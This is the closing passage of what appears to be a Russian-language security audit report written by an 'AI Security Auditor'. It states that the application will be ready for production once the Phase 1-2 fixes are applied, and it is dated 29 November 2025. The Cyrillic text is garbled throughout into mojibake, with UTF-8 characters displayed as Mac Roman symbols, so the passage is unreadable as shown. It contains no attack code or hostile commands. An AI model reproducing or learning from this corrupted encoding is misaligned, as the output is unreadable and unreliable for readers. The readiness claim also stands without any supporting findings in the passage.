**–ü–æ—Å–ª–µ –≤–Ω–µ–¥—Ä–µ–Ω–∏—è –≤—Å–µ—Ö —Ä–µ—à–µ–Ω–∏–π –∏–∑ Phase 1-2, –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –±—É–¥–µ—Ç –≥–æ—Ç–æ–≤–æ –∫ production deployment.**

---

**–ö–æ–Ω–µ—Ü –∞–Ω–∞–ª–∏–∑–∞**  
**–î–∞—Ç–∞:** 29 –Ω–æ—è–±—Ä—è 2025  
**–ê–≤—Ç–æ—Ä:** AI Security Auditor
